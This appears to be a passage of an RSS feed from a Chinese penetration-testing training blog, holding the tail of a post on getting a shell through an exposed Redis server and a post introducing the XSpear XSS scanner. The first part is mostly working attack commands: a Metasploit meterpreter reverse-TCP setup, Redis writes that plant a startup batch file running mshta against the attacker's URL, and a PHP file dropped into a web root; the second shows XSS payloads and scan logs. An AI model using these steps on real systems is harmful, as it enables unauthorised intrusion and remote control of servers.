    print_line(&amp;#34;mshta.exe \&amp;#34;#{url}\&amp;#34;&amp;#34;)
  end
end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后在 msf 里重新加载所有模块：reload_all&lt;/p&gt;&lt;p&gt;再找到这个模块就可以使用了&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;msf5 exploit(windows/msh_shell) &amp;gt; set payload windows/meterpreter/reverse_tcp
payload =&amp;gt; windows/meterpreter/reverse_tcp
msf5 exploit(windows/msh_shell) &amp;gt; set lhost xxx.xxx.xxx.xxx
lhost =&amp;gt; xxx.xxx.xxx.xxx
msf5 exploit(windows/msh_shell) &amp;gt; set uripath shell
uripath =&amp;gt; shell
msf5 exploit(windows/msh_shell) &amp;gt; exploit 
zlib(finalizer): the stream was freed prematurely.
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on xxx.xxx.xxx.xxx:4444 
[*] Using URL: http://0.0.0.0:8080/shell
[*] Local IP: http://xxx.xxx.xxx.xxx:8080/shell
[*] Server started.
[*] Place the following DDE in an MS document:
mshta.exe &amp;#34;http://xxx.xxx.xxx.xxx:8080/shell&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后利用 Redis 写入 bat 文件到启动项&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;[root@localhost src]# ./redis-cli -h xxx.xxx.xxx.xxx
xxx.xxx.xxx.xxx:6379&amp;gt; config set dir &amp;#34;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&amp;#34;
OK
xxx.xxx.xxx.xxx:6379&amp;gt; config set dbfilename shell.bat
OK
xxx.xxx.xxx.xxx:6379&amp;gt; set x &amp;#34;\r\n\r\nmshta http://xxx.xxx.xxx.xxx:8080/shell\r\n\r\n&amp;#34;
OK
xxx.xxx.xxx.xxx:6379&amp;gt; save
OK&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;重启靶机就可以拿到 session&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1231&quot; data-rawheight=&quot;340&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1231&quot; data-original=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1231&quot; data-rawheight=&quot;340&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1231&quot; data-original=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;003——使用Cobalt Strike&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;把 Cobalt Strike 的服务端脚本放到 kali 上运行，然后客户端在本机运行。&lt;/blockquote&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/aleenzz/Cobalt_Strike_wiki&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/aleenzz/Coba&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;lt_Strike_wiki&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;这里就不搭环境操作了。。。&lt;/p&gt;&lt;p&gt;&lt;b&gt;004——利用web服务&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果目标有 Web 业务的话，可以结合 web 业务进行 Getshell。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;[root@localhost src]# ./redis-cli -h xxx.xxx.xxx.xxx
xxx.xxx.xxx.xxx:6379&amp;gt; config set dir &amp;#34;C:/phpstudy/WWW&amp;#34;
OK
xxx.xxx.xxx.xxx:6379&amp;gt; config set dbfilename phpinfo.php
OK
xxx.xxx.xxx.xxx:6379&amp;gt; set x &amp;#34;\r\n\r\n&amp;lt;?php phpinfo();?&amp;gt;\r\n\r\n&amp;#34;
OK
xxx.xxx.xxx.xxx:6379&amp;gt; save
OK&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1954&quot; data-rawheight=&quot;677&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1954&quot; data-original=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1954&quot; data-rawheight=&quot;677&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1954&quot; data-original=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-08-101701119</guid>
<pubDate>Wed, 08 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>强大的XSS扫描工具：XSpear</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-07-101510369.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/101510369&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-b2b2d49e4d56b6cdc569d87e94aa3e13_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;都 2020 年了，还在手工测 XSS ？&lt;/p&gt;&lt;p&gt;还在往各种输入框里提交 &amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt; ?&lt;/p&gt;&lt;p&gt;有这功夫不如喝喝茶、划划水？&lt;/p&gt;&lt;p&gt;试试这款“X矛”吧，绝对会给你带来意想不到的收获。&lt;/p&gt;&lt;h2&gt;XSpear&lt;/h2&gt;&lt;blockquote&gt;一个针对 XSS 的扫描器。&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/hahwul/XSpear&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/hahwul/XSpea&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;顾名思义，一款基于 RubyGems 的 XSS 漏洞扫描器。能够进行常见的 XSS 扫描测试以及参数分析。&lt;/p&gt;&lt;h2&gt;功能&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;基于模式匹配的XSS扫描&lt;/li&gt;&lt;li&gt;alert confirm prompt 在无痕浏览器上检测事件（使用 Selenium）&lt;/li&gt;&lt;li&gt;XSS保护绕过和反射参数的测试请求/响应&lt;/li&gt;&lt;ul&gt;&lt;li&gt;反射参数&lt;/li&gt;&lt;li&gt;所有参数（适用于 XSS 和 Anytings）&lt;/li&gt;&lt;li&gt;过滤测试 event handler HTML tag Special Char Useful code &lt;/li&gt;&lt;/ul&gt;&lt;li&gt;测试 Blind XSS（使用 XSS Hunter，ezXSS，HBXSS，Etc 所有 url base 盲测...）&lt;/li&gt;&lt;li&gt;动态/静态分析&lt;/li&gt;&lt;ul&gt;&lt;li&gt;查找 SQL 错误模式&lt;/li&gt;&lt;li&gt;分析 Security 头（CSP HSTS X-frame-options，XSS-protection 等...）&lt;/li&gt;&lt;li&gt;分析其他头文件（服务器版本，内容类型等）&lt;/li&gt;&lt;li&gt;XSS 测试到 URL 路径&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;从原始文件扫描（Burp 套件，ZAP 请求）&lt;/li&gt;&lt;li&gt;XSpear 在 Ruby 代码上运行（带有 Gem 库）&lt;/li&gt;&lt;li&gt;显示 table base cli-report 和 filtered rule，testing raw query（url）&lt;/li&gt;&lt;li&gt;在所选参数上进行测试&lt;/li&gt;&lt;li&gt;支持输出格式 cli json&lt;/li&gt;&lt;ul&gt;&lt;li&gt;cli：摘要，过滤规则（参数），原始查询&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;支持详细级别（0〜3）&lt;/li&gt;&lt;ul&gt;&lt;li&gt;0：相当模式（仅结果）&lt;/li&gt;&lt;li&gt;1：显示扫描状态（默认）&lt;/li&gt;&lt;li&gt;2：显示扫描日志&lt;/li&gt;&lt;li&gt;3：显示详细记录&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;支持自定义回调代码以测试各种攻击媒介&lt;/li&gt;&lt;li&gt;支持配置文件&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;安装（Linux下）&lt;/h2&gt;&lt;blockquote&gt;Gem 是一个管理 Ruby 库和程序的标准包，它通过 Ruby Gem 源来查找、安装、升级和卸载软件包，非常的便捷。&lt;/blockquote&gt;&lt;p&gt;先安装依赖&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ gem install colorize
$ gem install selenium-webdriver
$ gem install terminal-table
$ gem install progress_bar&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再进行安装&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ gem install XSpear&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者本地安装特定版本&lt;/p&gt;&lt;p&gt;下载地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/hahwul/XSpear/releases&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/hahwul/XSpea&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;r/releases&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;再进行安装&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ gem install XSpear-1.3.1.gem&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将此行添加到应用程序的Gemfile：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;gem &amp;#39;XSpear&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后执行&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ bundle&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c26c76dd2aadaf414dfca891640c38d0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1229&quot; data-rawheight=&quot;908&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1229&quot; data-original=&quot;https://pic1.zhimg.com/v2-c26c76dd2aadaf414dfca891640c38d0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c26c76dd2aadaf414dfca891640c38d0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1229&quot; data-rawheight=&quot;908&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1229&quot; data-original=&quot;https://pic1.zhimg.com/v2-c26c76dd2aadaf414dfca891640c38d0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-c26c76dd2aadaf414dfca891640c38d0_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;CLI的用法&lt;/h2&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Usage: xspear -u [target] -[options] [value]
[ e.g ]
$ xspear -u &amp;#39;https://www.hahwul.com/?q=123&amp;#39; --cookie=&amp;#39;role=admin&amp;#39; -v 1 -a 
$ xspear -u &amp;#34;http://testphp.vulnweb.com/listproducts.php?cat=123&amp;#34; -v 2

[ Options ]
    -u, --url=target_URL             [required] Target Url
    -d, --data=POST Body             [optional] POST Method Body data
    -a, --test-all-params            [optional] test to all params(include not reflected)
        --headers=HEADERS            [optional] Add HTTP Headers
        --cookie=COOKIE              [optional] Add Cookie
        --raw=FILENAME               [optional] Load raw file(e.g raw_sample.txt)
    -p, --param=PARAM                [optional] Test paramters
    -b, --BLIND=URL                  [optional] Add vector of Blind XSS
                                      + with XSS Hunter, ezXSS, HBXSS, etc...
                                      + e.g : -b https://hahwul.xss.ht
    -t, --threads=NUMBER             [optional] thread , default: 10
    -o, --output=FORMAT              [optional] Output format (cli , json)
    -c, --config=FILENAME            [optional] Using config.json
    -v, --verbose=0~3                [optional] Show log depth
                                      + v=0 : quite mode(only result)
                                      + v=1 : show scanning status(default)
                                      + v=2 : show scanning logs
                                      + v=3 : show detail log(req/res)
    -h, --help                       Prints this help
        --version                    Show XSpear version
        --update                     Show how to update&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3&gt;输出的结果类型&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;（I）NFO：获取信息（例如sql错误，过滤规则，反映的参数等。）&lt;/li&gt;&lt;li&gt;（V）UNL：易受攻击的XSS，已通过Selenium检查/警告/提示/确认&lt;/li&gt;&lt;li&gt;（L）OW：低级别问题&lt;/li&gt;&lt;li&gt;（M）EDIUM：中级问题&lt;/li&gt;&lt;li&gt;（H）IGH：高级别问题&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;测试&lt;/h2&gt;&lt;p&gt;&lt;b&gt;[0]完全模式（仅显示结果）&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ xspear -u &amp;#34;http://testphp.vulnweb.com/listproducts.php?cat=123&amp;#34; -v 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;[1]显示进度条（默认）&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ xspear -u &amp;#34;http://testphp.vulnweb.com/listproducts.php?cat=123&amp;#34; -v 1
[*] analysis request..
[*] used test-reflected-params mode(default)
[*] creating a test query [for reflected 2 param + blind XSS ]
[*] test query generation is complete. [249 query]
[*] starting XSS Scanning. [10 threads]

[#######################################] [249/249] [100.00%] [01:05] [00:00] [  3.83/s]
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;[2]显示扫描日志&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ xspear -u &amp;#34;http://testphp.vulnweb.com/listproducts.php?cat=123&amp;#34; -v 2
[*] analysis request..
[I] [22:42:41] [200/OK] [param: cat][Found SQL Error Pattern]
[-] [22:42:41] [200/OK] &amp;#39;STATIC&amp;#39; not reflected
[-] [22:42:41] [200/OK] &amp;#39;cat&amp;#39; not reflected &amp;lt;script&amp;gt;alert(45)&amp;lt;/script&amp;gt;
[I] [22:42:41] [200/OK] reflected rEfe6[param: cat][reflected parameter]
[*] used test-reflected-params mode(default)
[*] creating a test query [for reflected 2 param + blind XSS ]
[*] test query generation is complete. [249 query]
[*] starting XSS Scanning. [10 threads]
[I] [22:42:43] [200/OK] reflected onhwul=64[param: cat][reflected EHon{any} pattern]
[-] [22:42:54] [200/OK] &amp;#39;cat&amp;#39; not reflected &amp;lt;img/src onerror=alert(45)&amp;gt;
[-] [22:42:54] [200/OK] &amp;#39;cat&amp;#39; not reflected &amp;lt;svg/onload=alert(45)&amp;gt;
[H] [22:42:54] [200/OK] reflected &amp;lt;script&amp;gt;alert(45)&amp;lt;/script&amp;gt;[param: cat][reflected XSS Code]
[V] [22:42:59] [200/OK] found alert/prompt/confirm (45) in selenium!! &amp;#39;&amp;#34;&amp;gt;&amp;lt;svg/onload=alert(45)&amp;gt;[param: cat][triggered &amp;lt;svg/onload=alert(45)&amp;gt;]
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;[3]显示扫描详细日志&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ xspear -u &amp;#34;http://testphp.vulnweb.com/listproducts.php?cat=123&amp;#34; -v 3
[*] analysis request..
[-] [22:56:21] [200/OK] http://testphp.vulnweb.com/listproducts.php?cat=123 in url
[ Request ]
{&amp;#34;accept-encoding&amp;#34;=&amp;gt;[&amp;#34;gzip;q=1.0,deflate;q=0.6,identity;q=0.3&amp;#34;], &amp;#34;accept&amp;#34;=&amp;gt;[&amp;#34;*/*&amp;#34;], &amp;#34;user-agent&amp;#34;=&amp;gt;[&amp;#34;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&amp;#34;], &amp;#34;connection&amp;#34;=&amp;gt;[&amp;#34;keep-alive&amp;#34;], &amp;#34;host&amp;#34;=&amp;gt;[&amp;#34;testphp.vulnweb.com&amp;#34;]}
[ Response ]
{&amp;#34;server&amp;#34;=&amp;gt;[&amp;#34;nginx/1.4.1&amp;#34;], &amp;#34;date&amp;#34;=&amp;gt;[&amp;#34;Sun, 29 Dec 2019 13:53:23 GMT&amp;#34;], &amp;#34;content-type&amp;#34;=&amp;gt;[&amp;#34;text/html&amp;#34;], &amp;#34;transfer-encoding&amp;#34;=&amp;gt;[&amp;#34;chunked&amp;#34;], &amp;#34;connection&amp;#34;=&amp;gt;[&amp;#34;keep-alive&amp;#34;], &amp;#34;x-powered-by&amp;#34;=&amp;gt;[&amp;#34;PHP/5.3.10-1~lucid+2uwsgi2&amp;#34;]}
[-] [22:56:21] [200/OK] &amp;#39;STATIC&amp;#39; not reflected
[-] [22:56:21] [200/OK] cat=123rEfe6 in url
...
[*] used test-reflected-params mode(default)
[*] creating a test query [for reflected 2 param + blind XSS ]
[*] test query generation is complete. [249 query]
[*] starting XSS Scanning. [10 threads]
...
[ Request ]
{&amp;#34;accept-encoding&amp;#34;=&amp;gt;[&amp;#34;gzip;q=1.0,deflate;q=0.6,identity;q=0.3&amp;#34;], &amp;#34;accept&amp;#34;=&amp;gt;[&amp;#34;*/*&amp;#34;], &amp;#34;user-agent&amp;#34;=&amp;gt;[&amp;#34;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&amp;#34;], &amp;#34;connection&amp;#34;=&amp;gt;[&amp;#34;keep-alive&amp;#34;], &amp;#34;host&amp;#34;=&amp;gt;[&amp;#34;testphp.vulnweb.com&amp;#34;]}
[ Response ]
{&amp;#34;server&amp;#34;=&amp;gt;[&amp;#34;nginx/1.4.1&amp;#34;], &amp;#34;date&amp;#34;=&amp;gt;[&amp;#34;Sun, 29 Dec 2019 13:54:36 GMT&amp;#34;], &amp;#34;content-type&amp;#34;=&amp;gt;[&amp;#34;text/html&amp;#34;], &amp;#34;transfer-encoding&amp;#34;=&amp;gt;[&amp;#34;chunked&amp;#34;], &amp;#34;connection&amp;#34;=&amp;gt;[&amp;#34;keep-alive&amp;#34;], &amp;#34;x-powered-by&amp;#34;=&amp;gt;[&amp;#34;PHP/5.3.10-1~lucid+2uwsgi2&amp;#34;]}
[H] [22:57:33] [200/OK] reflected &amp;lt;keygen autofocus onfocus=alert(45)&amp;gt;[param: cat][reflected onfocus XSS Code]
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;案例测试&lt;/h2&gt;&lt;p&gt;&lt;b&gt;扫描XSS&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ xspear -u &amp;#34;http://testphp.vulnweb.com/search.php?test=query&amp;#34; -d &amp;#34;searchFor=yy&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;输出 JSON&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ xspear -u &amp;#34;http://testphp.vulnweb.com/search.php?test=query&amp;#34; -d &amp;#34;searchFor=yy&amp;#34; -o json -v 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;设定线程数&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ xspear -u &amp;#34;http://testphp.vulnweb.com/search.php?test=query&amp;#34; -t 30&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;在所选参数下进行测试&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ xspear -u &amp;#34;http://testphp.vulnweb.com/search.php?test=query&amp;amp;cat=123&amp;amp;ppl=1fhhahwul&amp;#34; -p cat,test&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;在所有参数下测试&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ xspear -u &amp;#34;http://testphp.vulnweb.com/search.php?test=query&amp;amp;cat=123&amp;amp;ppl=1fhhahwul&amp;#34; -a&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;盲测 xss（所有参数）&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ xspear -u &amp;#34;http://testphp.vulnweb.com/search.php?test=query&amp;#34; -b &amp;#34;https://hahwul.xss.ht&amp;#34; -a

# Set your blind xss host. &amp;lt;-b options&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;在 Burpsuite 上安装&lt;/h2&gt;&lt;p&gt;请参考：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/hahwul/XSpear/tree/master/forBurp&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/hahwul/XSpea&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;r/tree/master/forBurp&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.hahwul.com/2019/12/run-other-application-on-burp-suiteburp.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;hahwul.com/2019/12/run-&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;other-application-on-burp-suiteburp.html&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;使用&lt;/h2&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-656eb99244181c2f40f9b53ab615fe5e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1085&quot; data-rawheight=&quot;1036&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1085&quot; data-original=&quot;https://pic3.zhimg.com/v2-656eb99244181c2f40f9b53ab615fe5e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-656eb99244181c2f40f9b53ab615fe5e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1085&quot; data-rawheight=&quot;1036&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1085&quot; data-original=&quot;https://pic3.zhimg.com/v2-656eb99244181c2f40f9b53ab615fe5e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-656eb99244181c2f40f9b53ab615fe5e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-07-101510369</guid>
<pubDate>Tue, 07 Jan 2020 00:00:00 +0800</pubDate>
